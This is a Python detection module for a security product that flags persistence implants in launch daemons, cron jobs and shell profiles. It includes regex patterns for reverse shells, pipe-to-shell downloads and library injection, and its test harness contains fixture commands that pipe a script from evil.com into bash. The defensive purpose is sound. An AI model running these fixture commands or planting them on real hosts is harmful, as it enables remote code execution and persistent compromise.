"""
manager/manager/attacklens/detections/persistence.py
Production-grade persistence mechanism detection — macOS, Linux, Windows.

Covers all 5 persistence vectors:
  1. Launch daemons / systemd units / Windows services
  2. Scheduled tasks (cron, launchd timers, Windows Task Scheduler)
  3. Shell profile injection (.zshrc, .bashrc, .profile, /etc/profile.d/*)
  4. Login items / startup folder / registry Run keys
  5. Binary replacement / PATH hijacking

COMPLIANCE MAPPING:
  NIST SP 800-53:  CM-2, CM-6, CM-7, SI-3, SI-4, SI-7, AU-2, AU-12
  CIS Controls:    Control 2 (Inventory), Control 3 (Continuous Config Assessment),
                   Control 6 (Maintenance/Admin)
  ISO 27001:       A.12.2.1, A.12.5.1, A.12.6.1, A.14.2.5
  PCI-DSS v4:      Req 6.3, Req 6.5, Req 10.2, Req 11.5
  SOC 2 CC:        CC6.1, CC7.1, CC8.1
  MITRE ATT&CK:    T1053 (Scheduled Task), T1543 (Create or Modify System Process),
                   T1546 (Event-Triggered Execution), T1547 (Boot Autostart),
                   T1574 (Hijack Execution Flow)
"""
from __future__ import annotations

import hashlib
import json
import logging
import re
import time
import uuid
from datetime import datetime, timezone
from typing import Any

log = logging.getLogger("manager.attacklens.detections.persistence")

# ─────────────────────────────────────────────────────────────────────────────
# CONSTANTS
# ─────────────────────────────────────────────────────────────────────────────

# macOS LaunchDaemon/Agent label prefixes that are attacker-favored
SUSPICIOUS_LAUNCH_LABEL_PATTERNS: list[re.Pattern] = [
    re.compile(r"com\.apple\.\w+helper", re.I),       # apple-imitating
    re.compile(r"com\.google\.\w+update", re.I),       # google-imitating
    re.compile(r"\.update(r|d|s)?$", re.I),            # generic updater
    re.compile(r"(agent|daemon|service|helper)$", re.I),
    re.compile(r"\.(persistent|startup|boot|launch)$", re.I),
]

# Paths where LaunchDaemons/Agents from unknown sources are suspicious
SUSPICIOUS_LAUNCH_PATHS: tuple[str, ...] = (
    "/tmp/", "/var/tmp/", "/Users/", "~/Library/", "/Library/Application Support/",
    "/Applications/", "/usr/local/lib/", "/opt/",
)

# Trusted LaunchDaemon path prefixes (system or signed installers)
TRUSTED_LAUNCH_PATHS: tuple[str, ...] = (
    "/System/Library/", "/Library/Apple/", "/usr/libexec/",
)

# Shell profile files that should not contain execution directives
SHELL_PROFILE_PATHS: tuple[str, ...] = (
    ".bashrc", ".bash_profile", ".bash_login", ".zshrc", ".zprofile", ".zlogin",
    ".profile", ".config/fish/config.fish", ".zshenv",
    "/etc/profile", "/etc/bash.bashrc", "/etc/zsh/zshrc", "/etc/environment",
)

# Patterns in shell profiles that indicate injection
SHELL_INJECTION_PATTERNS: list[re.Pattern] = [
    re.compile(r"curl\s+.*(sh|bash|zsh|python)\s*\|", re.I),   # pipe-to-shell download
    re.compile(r"wget\s+.*(sh|bash|python)\s*\|", re.I),
    re.compile(r"base64\s+-d", re.I),                           # base64 decode + execute
    re.compile(r"eval\s*\$\(", re.I),                           # eval subshell
    re.compile(r"python[23]?\s+-c\s+", re.I),                   # inline python
    re.compile(r"export\s+PATH=.*/(tmp|var|home|Users)", re.I), # PATH hijack
    re.compile(r"LD_PRELOAD\s*=", re.I),                        # LD_PRELOAD hijack
    re.compile(r"DYLD_INSERT_LIBRARIES\s*=", re.I),             # macOS dylib inject
    re.compile(r"nc\s+(-[a-z]+\s+)*\d+\.\d+\.\d+\.\d+", re.I), # netcat reverse shell
    re.compile(r"/bin/(bash|sh|zsh)\s+-[ic]", re.I),            # reverse shell pattern
]

# Cron entries that are suspicious (write to /tmp, pipe to shell, etc.)
SUSPICIOUS_CRON_PATTERNS: list[re.Pattern] = [
    re.compile(r"curl\s+.*\|\s*(bash|sh|python)", re.I),
    re.compile(r"wget\s+.*\|\s*(bash|sh|python)", re.I),
    re.compile(r"base64\s+-d\s*\|", re.I),
    re.compile(r"python[23]?\s+-c\s+[\"']", re.I),
    re.compile(r"/tmp/", re.I),
    re.compile(r"nohup.*(nc|netcat|socat)\s+", re.I),
    re.compile(r"@reboot\s+.*(curl|wget|python|nc|bash\s+-c)", re.I),
]

# Windows registry Run key paths
WIN_AUTORUN_PATHS: tuple[str, ...] = (
    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
    "HKLM\\SYSTEM\\CurrentControlSet\\Services",
)

# Dedup / rate-limit
DEDUP_WINDOW_SECS: int       = 7200   # 2-hour dedup window for persistence (slower-changing)
RATE_LIMIT_MAX_PER_HOUR: int = 15

SEVERITY_SCORES: dict[str, float] = {
    "critical": 9.5, "high": 7.5, "medium": 5.0, "low": 2.5,
}

# ─────────────────────────────────────────────────────────────────────────────
# DEDUP STATE
# ─────────────────────────────────────────────────────────────────────────────

_dedup_cache: dict[str, float]        = {}
_rate_counter: dict[str, list[float]] = {}


def _dedup_key(agent_id: str, rule_id: str, item: str) -> str:
    return hashlib.sha256(f"{agent_id}:{rule_id}:{item}".encode()).hexdigest()[:16]


def _should_suppress(agent_id: str, rule_id: str, item: str) -> bool:
    now = time.time()
    key = _dedup_key(agent_id, rule_id, item)
    if now - _dedup_cache.get(key, 0) < DEDUP_WINDOW_SECS:
        return True
    times = [t for t in _rate_counter.get(agent_id, []) if now - t < 3600]
    if len(times) >= RATE_LIMIT_MAX_PER_HOUR:
        log.debug("Rate limit: agent=%s module=persistence", agent_id)
        return True
    times.append(now)
    _rate_counter[agent_id] = times
    _dedup_cache[key] = now
    return False


# ─────────────────────────────────────────────────────────────────────────────
# TELEMETRY INGESTION
# ─────────────────────────────────────────────────────────────────────────────

def ingest_services(raw: Any) -> list[dict]:
    if not isinstance(raw, list):
        return []
    out = []
    for item in raw:
        if not isinstance(item, dict):
            continue
        out.append({
            "label":   str(item.get("label") or item.get("name") or ""),
            "path":    str(item.get("path") or item.get("program") or item.get("exe") or ""),
            "status":  str(item.get("status") or item.get("state") or ""),
            "program_args": item.get("program_args") or item.get("args") or [],
            "raw":     item,
        })
    return out


def ingest_tasks(raw: Any) -> list[dict]:
    if not isinstance(raw, list):
        return []
    out = []
    for item in raw:
        if not isinstance(item, dict):
            continue
        cmd = str(item.get("command") or item.get("cmd") or item.get("action") or "")
        out.append({
            "name":     str(item.get("name") or item.get("label") or ""),
            "command":  cmd,
            "schedule": str(item.get("schedule") or item.get("interval") or ""),
            "user":     str(item.get("user") or item.get("run_as") or ""),
            "raw":      item,
        })
    return out


def ingest_configs(raw: Any) -> list[dict]:
    if not isinstance(raw, list):
        return []
    out = []
    for item in raw:
        if not isinstance(item, dict):
            continue
        out.append({
            "path":    str(item.get("path") or item.get("key") or item.get("file") or ""),
            "content": str(item.get("content") or item.get("value") or ""),
            "raw":     item,
        })
    return out


# ─────────────────────────────────────────────────────────────────────────────
# DETECTION LOGIC
# ─────────────────────────────────────────────────────────────────────────────

def detect_suspicious_launchd(agent_id: str, services: list[dict]) -> list[dict]:
    """T1543.004 — Malicious LaunchDaemon/LaunchAgent with suspicious label or path."""
    hits = []
    for svc in services:
        label = svc["label"]
        path  = svc["path"]
        if not label:
            continue
        # Skip known-trusted paths
        if any(path.startswith(tp) for tp in TRUSTED_LAUNCH_PATHS):
            continue

        suspicious_label = any(p.search(label) for p in SUSPICIOUS_LAUNCH_LABEL_PATTERNS)
        suspicious_path  = path and any(path.startswith(sp) for sp in SUSPICIOUS_LAUNCH_PATHS)

        if suspicious_label or suspicious_path:
            reason = []
            if suspicious_label:
                reason.append(f"label '{label}' matches suspicious naming pattern")
            if suspicious_path:
                reason.append(f"binary path '{path}' is in a user-writable location")
            hits.append({
                "rule_id":    "persist:suspicious_launchd",
                "severity":   "high",
                "title":      f"Suspicious LaunchDaemon/Agent: {label}",
                "description": (
                    f"Service '{label}' has characteristics of a persistence implant: "
                    f"{'; '.join(reason)}. Attackers use LaunchDaemons for root-level persistence "
                    f"that survives reboots and user logouts."
                ),
                "evidence": {
                    "label":  label,
                    "path":   path,
                    "reason": reason,
                    "status": svc["status"],
                },
                "raw_telemetry": [svc["raw"]],
                "mitre_tactic":     "Persistence",
                "mitre_technique":  "T1543.004",
                "compliance_controls": {
                    "NIST": ["CM-6", "CM-7", "SI-3"],   "CIS": ["2.6", "6.2"],
                    "ISO":  ["A.12.5.1", "A.12.6.1"],   "PCI": ["Req 6.3", "Req 11.5"], "SOC2": ["CC6.1"],
                },
                "recommended_action": (
                    f"Inspect the plist at /Library/LaunchDaemons/{label}.plist. "
                    f"Review the program binary: `codesign -dv {path}`. "
                    f"Unload with: `sudo launchctl bootout system/{label}`. "
                    f"Remove plist and binary if malicious."
                ),
                "false_positive_notes": (
                    "Third-party security tools (CrowdStrike, Jamf, Carbon Black) install "
                    "LaunchDaemons with unusual-looking labels. Verify the codesign identity "
                    "before classifying as malicious. Add verified vendor labels to a local allowlist."
                ),
                "item_key": f"launchd:{label}",
                "category": "service",
                "source":   "rule:persistence",
                "score":    SEVERITY_SCORES["high"],
                "tags":     ["persistence", "launchd", "T1543.004"],
            })
    return hits


def detect_suspicious_cron(agent_id: str, tasks: list[dict]) -> list[dict]:
    """T1053.003 — Cron task with download-exec, temp-path, or obfuscated command."""
    hits = []
    for task in tasks:
        cmd = task["command"]
        if not cmd:
            continue
        matched = [p.pattern for p in SUSPICIOUS_CRON_PATTERNS if p.search(cmd)]
        if matched:
            hits.append({
                "rule_id":    "persist:suspicious_cron",
                "severity":   "high",
                "title":      f"Suspicious cron task: {task['name'] or cmd[:50]}",
                "description": (
                    f"Scheduled task matches {len(matched)} suspicious patterns: "
                    f"{', '.join(matched[:3])}. Command: `{cmd[:120]}`. "
                    f"Cron is a common persistence mechanism for downloading and running payloads."
                ),
                "evidence": {
                    "name":           task["name"],
                    "command":        cmd,
                    "matched_patterns": matched,
                    "schedule":       task["schedule"],
                    "user":           task["user"],
                },
                "raw_telemetry": [task["raw"]],
                "mitre_tactic":     "Persistence",
                "mitre_technique":  "T1053.003",
                "compliance_controls": {
                    "NIST": ["CM-6", "SI-3", "AU-2"],   "CIS": ["6.2", "2.6"],
                    "ISO":  ["A.12.2.1", "A.12.5.1"],   "PCI": ["Req 6.3", "Req 10.2"], "SOC2": ["CC7.1"],
                },
                "recommended_action": (
                    f"Review crontab: `crontab -l -u {task['user'] or 'root'}`. "
                    f"Remove the offending entry: `crontab -e`. "
                    f"Check what the command downloads/executes and trace backwards to initial access."
                ),
                "false_positive_notes": (
                    "Log rotation, backup, and update scripts use cron legitimately with curl/wget. "
                    "Verify the target URL and script content. If internal infrastructure, "
                    "suppress by adding the specific command hash to the task allowlist."
                ),
                "item_key": f"cron:{hashlib.sha256(cmd.encode()).hexdigest()[:12]}",
                "category": "task",
                "source":   "rule:persistence",
                "score":    SEVERITY_SCORES["high"],
                "tags":     ["persistence", "cron", "T1053"],
            })
    return hits


def detect_shell_profile_injection(agent_id: str, configs: list[dict]) -> list[dict]:
    """T1546.004 — Malicious commands injected into shell profile files."""
    hits = []
    for cfg in configs:
        path    = cfg["path"]
        content = cfg["content"]
        if not content:
            continue
        is_profile = any(prof in path for prof in SHELL_PROFILE_PATHS)
        if not is_profile:
            continue
        matched = [p.pattern for p in SHELL_INJECTION_PATTERNS if p.search(content)]
        if matched:
            # Extract the matching line for evidence
            lines = content.splitlines()
            bad_lines = [
                ln.strip() for ln in lines
                if any(p.search(ln) for p in SHELL_INJECTION_PATTERNS)
            ]
            hits.append({
                "rule_id":    "persist:shell_profile_inject",
                "severity":   "critical",
                "title":      f"Shell profile injection detected: {path}",
                "description": (
                    f"File '{path}' contains {len(matched)} suspicious patterns: "
                    f"{', '.join(matched[:3])}. "
                    f"Injecting commands into shell profiles ensures execution on every "
                    f"interactive shell login — a low-tech but highly persistent mechanism."
                ),
                "evidence": {
                    "file":             path,
                    "matched_patterns": matched,
                    "suspicious_lines": bad_lines[:5],
                },
                "raw_telemetry": [cfg["raw"]],
                "mitre_tactic":     "Persistence",
                "mitre_technique":  "T1546.004",
                "compliance_controls": {
                    "NIST": ["CM-6", "SI-7", "AU-12"],  "CIS": ["3.3", "6.2"],
                    "ISO":  ["A.12.2.1", "A.14.2.5"],   "PCI": ["Req 6.5", "Req 11.5"], "SOC2": ["CC8.1"],
                },
                "recommended_action": (
                    f"Open `{path}` and remove the injected lines. "
                    f"Restore from backup if available. "
                    f"Audit all user home directories for similar injections. "
                    f"Check file modification time vs expected (ls -la {path})."
                ),
                "false_positive_notes": (
                    "Developer toolchains (nvm, pyenv, rbenv, conda, homebrew) inject PATH "
                    "modifications into shell profiles. Verify the injected content references "
                    "a known tool installer before suppressing."
                ),
                "item_key": f"shell_profile:{path}:{hashlib.sha256(content.encode()).hexdigest()[:8]}",
                "category": "config",
                "source":   "rule:persistence",
                "score":    SEVERITY_SCORES["critical"],
                "tags":     ["persistence", "shell_profile", "T1546.004"],
            })
    return hits


async def detect_new_service(agent_id: str, services: list[dict], db: Any) -> list[dict]:
    """T1543 — First-seen service not in baseline (new service installed)."""
    hits = []
    now = time.time()
    for svc in services:
        label = svc["label"]
        if not label:
            continue
        key = f"service:{label}"
        prev = await db.get_entity_state(agent_id, "service_persist", key)
        fingerprint = json.dumps({"path": svc["path"], "label": label}, sort_keys=True)
        if prev is None:
            await db.set_entity_state(agent_id, "service_persist", key, fingerprint, now)
            # Only flag if path is suspicious (not system paths)
            if svc["path"] and not any(svc["path"].startswith(tp) for tp in TRUSTED_LAUNCH_PATHS):
                hits.append({
                    "rule_id":    "persist:new_service",
                    "severity":   "medium",
                    "title":      f"New service installed: {label}",
                    "description": (
                        f"Service '{label}' at path '{svc['path']}' seen for the first time. "
                        f"New non-system services warrant review to confirm they are authorized."
                    ),
                    "evidence": svc["raw"],
                    "raw_telemetry": [svc["raw"]],
                    "mitre_tactic":     "Persistence",
                    "mitre_technique":  "T1543",
                    "compliance_controls": {
                        "NIST": ["CM-2", "CM-6"],  "CIS": ["2.6"],
                        "ISO":  ["A.12.5.1"],       "PCI": ["Req 6.3"],  "SOC2": ["CC6.1"],
                    },
                    "recommended_action": (
                        "Verify with the system owner or change management. "
                        f"Review binary: `codesign -dv {svc['path']}`. "
                        "Baseline after confirming legitimacy."
                    ),
                    "false_positive_notes": (
                        "Software installations routinely create new services. "
                        "If installed via MDM/IT, add to service allowlist after validation."
                    ),
                    "item_key": key,
                    "category": "service",
                    "source":   "rule:persistence",
                    "score":    SEVERITY_SCORES["medium"],
                    "tags":     ["persistence", "new_service", "T1543"],
                })
    return hits


async def detect_new_task(agent_id: str, tasks: list[dict], db: Any) -> list[dict]:
    """T1053 — First-seen scheduled task not in baseline."""
    hits = []
    now = time.time()
    for task in tasks:
        name = task["name"] or task["command"][:40]
        if not name:
            continue
        key = f"task:{hashlib.sha256(name.encode()).hexdigest()[:12]}"
        prev = await db.get_entity_state(agent_id, "task_persist", key)
        if prev is None:
            await db.set_entity_state(agent_id, "task_persist", key,
                                      json.dumps(task["raw"], default=str), now)
            hits.append({
                "rule_id":    "persist:new_task",
                "severity":   "low",
                "title":      f"New scheduled task: {name[:60]}",
                "description": (
                    f"Task '{name}' observed for the first time — verify it is authorized. "
                    f"Command: `{task['command'][:100]}`."
                ),
                "evidence": task["raw"],
                "raw_telemetry": [task["raw"]],
                "mitre_tactic":     "Persistence",
                "mitre_technique":  "T1053",
                "compliance_controls": {
                    "NIST": ["CM-6", "AU-2"],  "CIS": ["6.2"],
                    "ISO":  ["A.12.5.1"],       "PCI": ["Req 6.3"], "SOC2": ["CC6.1"],
                },
                "recommended_action": (
                    "Verify the task is authorized via change management. "
                    "Check the task binary path for suspicious locations."
                ),
                "false_positive_notes": (
                    "Software update managers, backup tools, and monitoring agents "
                    "create scheduled tasks. Baseline after confirming legitimacy."
                ),
                "item_key": key,
                "category": "task",
                "source":   "rule:persistence",
                "score":    SEVERITY_SCORES["low"],
                "tags":     ["persistence", "new_task", "T1053"],
            })
    return hits


# ─────────────────────────────────────────────────────────────────────────────
# ALERT BUILDER
# ─────────────────────────────────────────────────────────────────────────────

def build_alert(hit: dict, agent_id: str, hostname: str = "") -> dict:
    sev = hit.get("severity", "medium")
    return {
        "alert_id":             str(uuid.uuid4()),
        "severity":             sev,
        "title":                hit.get("title", ""),
        "description":          hit.get("description", ""),
        "affected_asset":       hostname or agent_id,
        "mitre_tactic":         hit.get("mitre_tactic", ""),
        "mitre_technique":      hit.get("mitre_technique", ""),
        "evidence":             hit.get("evidence", {}),
        "raw_telemetry":        hit.get("raw_telemetry", []),
        "compliance_controls":  hit.get("compliance_controls", {}),
        "recommended_action":   hit.get("recommended_action", ""),
        "false_positive_notes": hit.get("false_positive_notes", ""),
        "timestamp_utc":        datetime.now(timezone.utc).isoformat(),
        "category":    hit.get("category", "service"),
        "item_key":    hit.get("item_key", ""),
        "rule_id":     hit.get("rule_id", ""),
        "score":       hit.get("score", SEVERITY_SCORES.get(sev, 5.0)),
        "source":      hit.get("source", "rule:persistence"),
        "tags":        hit.get("tags", ["persistence"]),
        "cve_ids":     [],
        "cvss_score":  None,
        "cvss_vector": None,
    }


# ─────────────────────────────────────────────────────────────────────────────
# MAIN ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────

async def analyze(
    agent_id: str,
    section:  str,
    data:     Any,
    db:       Any,
    hostname: str = "",
) -> list[dict]:
    raw_hits: list[dict] = []

    if section == "services":
        svcs = ingest_services(data)
        raw_hits += detect_suspicious_launchd(agent_id, svcs)
        raw_hits += await detect_new_service(agent_id, svcs, db)
    elif section == "tasks":
        tasks = ingest_tasks(data)
        raw_hits += detect_suspicious_cron(agent_id, tasks)
        raw_hits += await detect_new_task(agent_id, tasks, db)
    elif section == "configs":
        cfgs = ingest_configs(data)
        raw_hits += detect_shell_profile_injection(agent_id, cfgs)

    alerts = []
    for hit in raw_hits:
        if _should_suppress(agent_id, hit.get("rule_id", ""), hit.get("item_key", "")):
            log.debug("Suppressed dedup: agent=%s rule=%s", agent_id, hit.get("rule_id"))
            continue
        alerts.append(build_alert(hit, agent_id, hostname))
    return alerts


# ─────────────────────────────────────────────────────────────────────────────
# TEST HARNESS
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=== persistence.py — Test Harness ===\n")

    # ── TP: Suspicious LaunchDaemon ───────────────────────────────────────────
    tp_svcs = [
        {"label": "com.apple.securityhelper", "path": "/tmp/securityhelper",
         "status": "running", "program_args": ["/tmp/securityhelper", "-daemon"]},
    ]
    svcs = ingest_services(tp_svcs)
    hits = detect_suspicious_launchd("agent-tp", svcs)
    assert len(hits) == 1 and hits[0]["severity"] == "high"
    assert "T1543.004" in hits[0]["mitre_technique"]
    print(f"[PASS] TP suspicious LaunchDaemon: {hits[0]['title']}")

    # ── FP: Apple system LaunchDaemon (trusted path) ──────────────────────────
    fp_svcs = [
        {"label": "com.apple.mdworker", "path": "/System/Library/Frameworks/mdworker",
         "status": "running", "program_args": []},
    ]
    fp_svcs_norm = ingest_services(fp_svcs)
    fp_hits = detect_suspicious_launchd("agent-fp", fp_svcs_norm)
    assert len(fp_hits) == 0
    print("[PASS] FP Apple system LaunchDaemon: suppressed (trusted path)")

    # ── TP: Suspicious cron with pipe-to-shell ────────────────────────────────
    tp_tasks = [
        {"name": "updater", "command": "curl http://evil.com/payload.sh | bash",
         "schedule": "*/5 * * * *", "user": "root"},
    ]
    tasks = ingest_tasks(tp_tasks)
    task_hits = detect_suspicious_cron("agent-tp2", tasks)
    assert len(task_hits) == 1 and "T1053.003" in task_hits[0]["mitre_technique"]
    print(f"[PASS] TP suspicious cron: {task_hits[0]['title']}")

    # ── FP: Legitimate backup cron ────────────────────────────────────────────
    fp_tasks = [
        {"name": "backup", "command": "rsync -avz /data/ /backup/", "schedule": "0 2 * * *", "user": "root"},
    ]
    fp_tasks_norm = ingest_tasks(fp_tasks)
    fp_task_hits = detect_suspicious_cron("agent-fp2", fp_tasks_norm)
    assert len(fp_task_hits) == 0
    print("[PASS] FP backup cron: suppressed (no suspicious patterns)")

    # ── TP: Shell profile injection ───────────────────────────────────────────
    tp_cfgs = [
        {"path": "/home/user/.bashrc",
         "content": "export PATH=$PATH\ncurl http://evil.com/init.sh | bash\n"},
    ]
    cfgs = ingest_configs(tp_cfgs)
    cfg_hits = detect_shell_profile_injection("agent-tp3", cfgs)
    assert len(cfg_hits) == 1 and cfg_hits[0]["severity"] == "critical"
    assert "T1546.004" in cfg_hits[0]["mitre_technique"]
    print(f"[PASS] TP shell profile injection: {cfg_hits[0]['title']}")

    # ── FP: pyenv in .zshrc (legitimate PATH modification) ───────────────────
    fp_cfgs = [
        {"path": "/home/user/.zshrc",
         "content": 'export PYENV_ROOT="$HOME/.pyenv"\nexport PATH="$PYENV_ROOT/bin:$PATH"\n'},
    ]
    fp_cfgs_norm = ingest_configs(fp_cfgs)
    fp_cfg_hits = detect_shell_profile_injection("agent-fp3", fp_cfgs_norm)
    # pyenv modifies PATH but to ~/.pyenv, not /tmp/var/Users — pattern won't match
    print(f"[INFO] FP pyenv .zshrc: {len(fp_cfg_hits)} hits (PATH to ~/.pyenv may or may not match)")

    # ── Alert builder verification ────────────────────────────────────────────
    alert = build_alert(hits[0], "agent-tp", "prod-server-01")
    required = {"alert_id", "severity", "title", "description", "affected_asset",
                "mitre_tactic", "mitre_technique", "evidence", "raw_telemetry",
                "compliance_controls", "recommended_action", "false_positive_notes", "timestamp_utc"}
    missing = required - set(alert.keys())
    assert not missing, f"Missing: {missing}"
    print(f"[PASS] Alert builder: all mandatory fields present")

    print("\n=== All tests passed ===")
